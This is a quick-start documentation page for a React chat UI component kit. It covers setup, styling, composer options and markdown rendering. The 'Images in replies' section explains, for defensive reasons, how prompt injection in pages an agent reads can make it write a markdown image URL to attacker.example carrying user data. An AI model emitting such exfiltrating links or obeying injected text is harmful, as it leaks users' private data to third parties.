---
title: Quick start
description: Put a ChatView on the page, and use it with Tailwind v4.
sidebar:
  order: 2
---

```tsx
import { ChatView, sseTransport, useChat } from "agentic-ui-kit";
import "agentic-ui-kit/styles.css";

const transport = sseTransport({ url: "/api/chat" });

export function App() {
  const chat = useChat({ transport });
  return (
    <div style={{ height: "100dvh" }}>
      <ChatView
        messages={chat.messages}
        busy={chat.busy}
        onSend={(text) => chat.send(text)}
        onStop={chat.stop}
        approvals={chat.approvals}
        onApprove={chat.respond}
      />
    </div>
  );
}
```

`ChatView` sizes itself from its container, so it works as a full page, a side panel or a small box in a form
(`density="full" | "panel" | "inline"`), and several fit side by side.

## Using Tailwind v4?

Import the Tailwind source instead of `styles.css`, so utilities are generated once by your build:

```css
@import "tailwindcss";
@import "agentic-ui-kit/tailwind.css";
```

`styles.css` includes Tailwind's base reset (preflight). In an app that already has its own reset, use
`tailwind.css`.

## The composer

Its text and buttons are yours:

- **Placeholder:** `composer={{ placeholder: "Ask anything" }}`. To change the default ("Reply…") for every
  chat, or translate it, use `<ChatTheme labels={{ replyPlaceholder: "…" }}>`.
- **Inside the box:** `leading` (left of the toolbar), `trailing` (right, before send), `above` (over the
  text, e.g. attachment chips).
- **Outside the box:** `renderComposer={(composer, where) => …}` wraps it on the empty screen
  (`where === "empty"`) and docked under the chat (`"docked"`), so you can put buttons above, beside or
  under it.

```tsx
<ChatView
  renderComposer={(composer, where) => (
    <div className="flex flex-col gap-2">
      {where === "empty" && <SuggestionChips onPick={send} />}
      {composer}
    </div>
  )}
/>
```

**No composer.** For a chat the reader only reads, or answers through approvals, pass `composer={false}`:
nothing is drawn under the conversation, `renderComposer` is not called, and `emptyState` gets `null` where
the composer would go.

## Links and lists in replies

Message markdown draws links and lists the kit's way. To draw your own, wrap the chat in
`MarkdownLinksProvider`:

```tsx
<MarkdownLinksProvider
  renderLink={({ href, children }) => (href.includes("/jobs/") ? <JobLink href={href}>{children}</JobLink> : undefined)}
  renderLinkList={({ links, ordered, children }) =>
    links.every((l) => l.href.includes("/jobs/")) ? <JobCards jobs={links} /> : undefined
  }
>
  <ChatView … />
</MarkdownLinksProvider>
```

`renderLinkList` is called for a bullet or numbered list in which every item is a single link and nothing
else. Each `links[i].children` is the link text as the kit rendered it, so word fade, bold and inline math
carry over. `children` is the list as the kit would draw it. Return `undefined` to keep it.

## Images in replies

Message markdown does not load remote images. `![alt](https://…)` shows as a link (the alt text, or the host
name) that opens in a new tab only when the reader clicks it. This is a changed default as of 0.8.0.

The reason is prompt injection. An agent that reads job postings or web pages can be told by that text to
write `![](https://attacker.example/?d=<what it knows about the user>)`, and the browser would send the data
the moment the reply renders, without a click. This covers raw HTML `<img>`, reference-style images and
`srcset` too. `data:image/` URLs always load, since they make no request.

To show images, wrap the chat in `MarkdownLinksProvider`:

```tsx
<MarkdownLinksProvider imageOrigins={["https://cdn.example.com"]}>
  <ChatView … />
</MarkdownLinksProvider>
```

`imageOrigins` lists the origins whose images load as `<img>`; any other image stays a link. `"all"` loads
every http(s) image, which brings the leak back for replies built from untrusted text. For full control pass
`renderImage={({ src, alt }) => …}`: you draw every image (an `<img>` through your own proxy, a link, or
`null` for nothing) and `imageOrigins` is not consulted.

## Model logos

A `ModelPicker` model (`ModelOption`) takes `icon`, a React node shown before its name in the menu and on the
button when it is selected.

## Attachments without a mime type

`AttachmentCard` takes `mime`, or `kind: "image" | "file"`, or neither: it then treats a `url` ending in
an image extension as an image.
